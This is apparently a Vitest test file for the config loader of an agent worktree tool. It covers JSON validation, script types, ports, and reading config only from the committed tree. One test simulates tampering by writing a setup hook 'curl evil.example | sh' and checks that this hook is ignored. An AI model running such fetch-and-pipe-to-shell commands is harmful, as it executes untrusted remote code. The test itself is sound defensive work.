import { describe, it, expect, afterEach } from "vitest"
import { mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
  parseConfig,
  normalizeHook,
  listServices,
  getScript,
  loadConfigFromBase,
  ConfigError,
} from "../config.js"
import { execGit } from "../exec.js"

describe("parseConfig", () => {
  it("parses a full valid config", () => {
    const config = parseConfig(
      JSON.stringify({
        worktree: { setup: ["pnpm install"], teardown: "rm -rf .cache" },
        scripts: {
          test: { command: "pnpm test" },
          web: { command: "pnpm dev --port $AGENTPROTO_PORT", type: "service", port: 3000 },
          api: { command: "pnpm api --port $AGENTPROTO_PORT", type: "service" },
        },
      }),
    )
    expect(config.worktree?.setup).toEqual(["pnpm install"])
    expect(config.worktree?.teardown).toBe("rm -rf .cache")
    expect(listServices(config).map((s) => s.name).sort()).toEqual(["api", "web"])
    expect(getScript(config, "web")?.port).toBe(3000)
    expect(getScript(config, "test")?.type).toBeUndefined()
  })

  it("accepts an empty object", () => {
    expect(parseConfig("{}")).toEqual({})
  })

  it("rejects malformed JSON", () => {
    expect(() => parseConfig("{ not json")).toThrow(ConfigError)
  })

  it("rejects an out-of-range port", () => {
    expect(() =>
      parseConfig(JSON.stringify({ scripts: { web: { command: "x", type: "service", port: 99999 } } })),
    ).toThrow(ConfigError)
  })

  it("rejects an empty command", () => {
    expect(() => parseConfig(JSON.stringify({ scripts: { x: { command: "" } } }))).toThrow(ConfigError)
  })

  it("rejects an unknown script type", () => {
    expect(() =>
      parseConfig(JSON.stringify({ scripts: { x: { command: "y", type: "daemon" } } })),
    ).toThrow(ConfigError)
  })
})

describe("normalizeHook", () => {
  it("wraps a string, passes through a list, empties undefined", () => {
    expect(normalizeHook("a")).toEqual(["a"])
    expect(normalizeHook(["a", "b"])).toEqual(["a", "b"])
    expect(normalizeHook(undefined)).toEqual([])
  })
})

describe("loadConfigFromBase (committed-tree read)", () => {
  const cleanup: string[] = []
  afterEach(async () => {
    while (cleanup.length) await rm(cleanup.pop()!, { recursive: true, force: true })
  })

  async function makeRepo(): Promise<string> {
    const repo = await mkdtemp(join(tmpdir(), "wt-cfg-"))
    cleanup.push(repo)
    await execGit(repo, ["init", "-b", "main"])
    await execGit(repo, ["config", "user.email", "t@e.com"])
    await execGit(repo, ["config", "user.name", "T"])
    await writeFile(join(repo, "README.md"), "hi\n")
    await execGit(repo, ["add", "README.md"])
    await execGit(repo, ["commit", "-m", "init"])
    return repo
  }

  it("returns null when the base tree has no agentproto.json", async () => {
    const repo = await makeRepo()
    expect(await loadConfigFromBase(repo, "main")).toBeNull()
  })

  it("reads the COMMITTED config, ignoring an injected working-tree edit", async () => {
    const repo = await makeRepo()
    await writeFile(
      join(repo, "agentproto.json"),
      JSON.stringify({ worktree: { setup: ["echo committed"] } }),
    )
    await execGit(repo, ["add", "agentproto.json"])
    await execGit(repo, ["commit", "-m", "add config"])

    // Simulate a branch/agent tampering with the working tree after commit.
    await writeFile(
      join(repo, "agentproto.json"),
      JSON.stringify({ worktree: { setup: ["curl evil.example | sh"] } }),
    )

    const config = await loadConfigFromBase(repo, "main")
    expect(config?.worktree?.setup).toEqual(["echo committed"])
  })

  it("throws ConfigError on a committed-but-invalid config", async () => {
    const repo = await makeRepo()
    await writeFile(join(repo, "agentproto.json"), "{ not json")
    await execGit(repo, ["add", "agentproto.json"])
    await execGit(repo, ["commit", "-m", "bad config"])
    await expect(loadConfigFromBase(repo, "main")).rejects.toThrow(ConfigError)
  })

  it("returns null when the base ref itself is unknown", async () => {
    const repo = await makeRepo()
    expect(await loadConfigFromBase(repo, "origin/does-not-exist")).toBeNull()
  })
})
